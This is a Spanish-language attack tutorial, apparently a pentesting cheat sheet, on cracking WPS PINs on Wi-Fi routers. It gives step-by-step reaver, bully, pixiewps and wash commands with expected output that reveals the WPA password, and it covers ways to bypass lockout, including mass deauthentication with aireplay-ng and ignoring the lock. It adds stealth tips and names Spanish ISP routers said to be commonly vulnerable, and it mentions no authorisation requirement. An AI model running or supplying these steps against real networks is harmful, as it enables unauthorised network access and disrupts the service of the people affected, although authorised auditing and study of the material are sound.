# WPS Attacks - Pixie Dust y Fuerza Bruta

WPS (Wi-Fi Protected Setup) es una funcionalidad diseñada para facilitar la conexión de dispositivos al router sin necesidad de introducir la contraseña. Usa un PIN de 8 dígitos, pero tiene un diseño fundamentalmente roto que permite crackearlo con muy pocos intentos.

### Por qué WPS es vulnerable

#### Vulnerabilidad del PIN dividido (Brute Force)

```
El PIN de WPS tiene 8 dígitos: XXXX XXXX
El último dígito es un checksum → solo 7 dígitos relevantes

El protocolo verifica las dos mitades por separado:
→ Primera mitad (4 dígitos): 10^4 = 10.000 posibilidades
→ Segunda mitad (3 dígitos): 10^3 = 1.000 posibilidades
→ Total: 10.000 + 1.000 = 11.000 intentos máximo

Comparado con los 10^7 = 10.000.000 intentos si fuera 1 bloque
→ El protocolo reduce el espacio de búsqueda en ~909 veces
```

#### Vulnerabilidad Pixie Dust (ataque offline instantáneo)

```
En routers con implementaciones débiles del generador de números aleatorios:
→ Los nonces (E-S1 y E-S2) son predecibles o iguales a 0
→ El PIN puede calcularse offline en segundos o milisegundos
→ No requiere múltiples intentos online → no hay lockout posible

APs vulnerables a Pixie Dust:
→ Ralink (MediaTek)
→ Realtek
→ Broadcom (algunos modelos)
→ Algunos modelos de Zyxel, D-Link, TP-Link (firmware antiguo)
```

### Paso 1 — Identificar APs con WPS activo

```bash
# wash — herramienta específica para escanear WPS
wash -i wlan0mon

# Columnas importantes:
# BSSID         → MAC del AP
# Ch            → Canal
# dBm           → Potencia de señal
# WPS           → Versión de WPS (1.0 / 2.0)
# Lck           → WPS Locked: No = vulnerable, Yes = bloqueado
# Vendor        → Fabricante del chipset (importante para Pixie Dust)
# ESSID         → Nombre de la red

# Para escanear solo 5 GHz
wash -i wlan0mon -5

# Guardar resultados
wash -i wlan0mon -o wps_scan.csv

# Filtrar solo los NO bloqueados
wash -i wlan0mon | grep "No"
```

#### Interpretar el estado WPS

```
WPS Lck: No  → WPS activo sin lockout → VULNERABLE al ataque de fuerza bruta
WPS Lck: Yes → WPS bloqueado temporalmente → puede desbloquearse con tiempo
             → El bloqueo suele durar 5-60 minutos según el fabricante
             → Probar Pixie Dust igualmente (no requiere múltiples intentos)

WPS 1.0  → Versión original, más vulnerable
WPS 2.0  → Versión mejorada, algunos tienen protecciones adicionales
```

### Paso 2 — Pixie Dust Attack (recomendado — probar siempre primero)

```bash
# Reaver con flag -K 1 para Pixie Dust
reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -K 1 \
    -vvv

# Parámetros:
# -i → interfaz en modo monitor
# -b → BSSID del AP objetivo
# -K 1 → activar Pixie Dust (offline attack)
# -vvv → verbose máximo para ver el proceso

# Si el AP es vulnerable, en segundos verás:
# [+] WPS PIN: 12345678
# [+] WPA PSK: 'ContraseñaDelaRed'
# [+] AP SSID: 'NombreRed'
```

#### Pixie Dust con Bully

```bash
# Bully es una alternativa a Reaver con mejor manejo de algunos APs
bully wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -d \
    -v 3

# -d → activa Pixie Dust
# -v 3 → verbose

# Si Pixie Dust tiene éxito:
# [+] Got WPS pin
# [+] WPS pin [12345678]
# [+] WPA key [ContraseñaDelaRed]
```

#### Pixie Dust con pixiewps (standalone)

```bash
# pixiewps es el motor de Pixie Dust que usan reaver y bully internamente
# Se puede usar directamente si se tienen los valores del exchange WPS

# Obtener los valores del intercambio WPS con reaver en modo debug
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv -S 2>&1 | tee reaver_debug.txt
# Buscar en la salida: E-Hash1, E-Hash2, E-Nonce, PKE, PKR

# Ejecutar pixiewps con los valores obtenidos
pixiewps -e E-HASH1 -r E-HASH2 -n E-NONCE -s PKE -z PKR
```

### Paso 3 — Fuerza Bruta del PIN (si Pixie Dust falla)

```bash
# SOLO usar si WPS Locked: No
# El lockout puede tardar horas o bloquear permanentemente

# Reaver — ataque de fuerza bruta estándar
reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -vvv

# Con delay entre intentos (evitar lockout)
reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -d 5 \
    -vvv
# -d 5 → 5 segundos de espera entre intentos

# Con reintentos automáticos y pausa (más sigiloso)
reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -d 5 \
    -r 3:15 \
    -vvv
# -r 3:15 → descansar 15 segundos cada 3 intentos

# Reanudar desde donde se quedó (si se interrumpió)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
# Reaver guarda el progreso automáticamente en /etc/reaver/

# Especificar PIN inicial (si ya se tienen los primeros 4 dígitos)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 1234 -vvv
```

#### Fuerza bruta con Bully

```bash
# Bully tiene mejor manejo de timeouts y reintentos
bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3

# Con canal específico
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Con delay
bully wlan0mon -b AA:BB:CC:DD:EE:FF -T 5 -v 3

# Forzar versión WPS
bully wlan0mon -b AA:BB:CC:DD:EE:FF -1 -v 3  # WPS 1.0
```

### Paso 4 — Manejo del lockout

```bash
# Si el AP bloquea WPS (Lck: Yes en wash):

# Opción 1: Esperar (5-60 minutos según el AP)
watch -n 30 wash -i wlan0mon   # verificar cada 30 segundos si se desbloquea

# Opción 2: Forzar reinicio del AP con deauth masivo
# (puede desbloquear WPS en algunos modelos)
aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# Opción 3: Cambiar el tiempo de espera en reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 60 -L -vvv
# -L → ignorar el estado locked y continuar igualmente
# -d 60 → 60 segundos entre intentos (respeta el cooldown)

# Opción 4: Si el lockout es permanente
# → Probar PMKID o Handshake attack en su lugar
```

### Interpretar el resultado

```bash
# Éxito total:
[+] WPS PIN: '12345678'
[+] WPA PSK: 'ContraseñaDeLaRed'
[+] AP SSID: 'NombreRed'

# Solo PIN (la PSK se puede obtener con el PIN):
[+] WPS PIN: '12345678'
# Usar el PIN para conectar vía WPS o para extraer la PSK:
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345678 -vvv

# Fallo con información útil:
# "WARNING: Detected AP rate limiting" → hay lockout
# "WARNING: Failed to associate" → problema de canal o distancia
# "Sending EAPOL START request" → intento en curso
```

### Consideraciones sobre WPS 2.0 y defensas

```
Defensas que pueden encontrarse en APs modernos:
→ WPS Lockout: bloquea tras N intentos fallidos
→ Rate limiting: limita la velocidad de intentos
→ AP Rate Limiting: aumenta el tiempo de respuesta progresivamente
→ WPS deshabilitado por defecto en nuevos modelos

WPS en routers españoles comunes:
→ Movistar (Askey, Sagemcom): frecuentemente vulnerable a Pixie Dust
→ Vodafone (Huawei, ZTE): PIN WPS fijo derivado del BSSID en algunos modelos
→ Orange (Mitrastar, Livebox): WPS activo por defecto en modelos antiguos

Derivación del PIN desde el BSSID (algunos modelos):
→ Algunos routers usan el BSSID como base para generar el PIN WPS
→ Herramienta: Router Keygen (Android) o scripts específicos
→ WPS PIN = función(BSSID, modelo) en routers Comtrend, algunos TP-Link...
```

### Comparativa de herramientas

| Herramienta  | Pixie Dust    | Brute Force | Velocidad | Estabilidad |
| ------------ | ------------- | ----------- | --------- | ----------- |
| **reaver**   | ✅ (-K 1)      | ✅           | Media     | Alta        |
| **bully**    | ✅ (-d)        | ✅           | Media     | Alta        |
| **pixiewps** | ✅ standalone  | ❌           | Alta      | Alta        |
| **wash**     | ❌ (solo scan) | ❌           | N/A       | Alta        |

### Flujo recomendado

```
1. wash -i wlan0mon
   → Identificar APs con WPS activo y NO bloqueado

2. reaver -i wlan0mon -b BSSID -K 1 -vvv
   → Pixie Dust (instantáneo si vulnerable)
   → Si funciona: contraseña obtenida en segundos ✅

3. Si Pixie Dust falla:
   → bully wlan0mon -b BSSID -d -v 3
   → Segundo intento de Pixie Dust con otra herramienta

4. Si ambos Pixie Dust fallan y WPS Locked: No:
   → reaver -i wlan0mon -b BSSID -d 5 -r 3:15 -vvv
   → Fuerza bruta (puede tardar 4-10 horas)

5. Si WPS Locked: Yes o fuerza bruta no es viable:
   → Cambiar a PMKID attack o Handshake + cracking
```

> Pixie Dust es el primer ataque que siempre debes probar: si el AP es vulnerable, obtienes la contraseña en segundos sin generar prácticamente ningún ruido. Muchos routers domésticos aún son vulnerables incluso con firmware actualizado.

> Ralink/MediaTek es el chipset más frecuentemente vulnerable a Pixie Dust. Si `wash` muestra "Ralink" en la columna Vendor → alta probabilidad de éxito con `-K 1`.

> La fuerza bruta del PIN WPS es muy lenta y ruidosa — genera cientos de intentos de autenticación en los logs del router. Usarla solo cuando Pixie Dust falla y cuando el tiempo no es una restricción. En redes de producción es muy detectable.
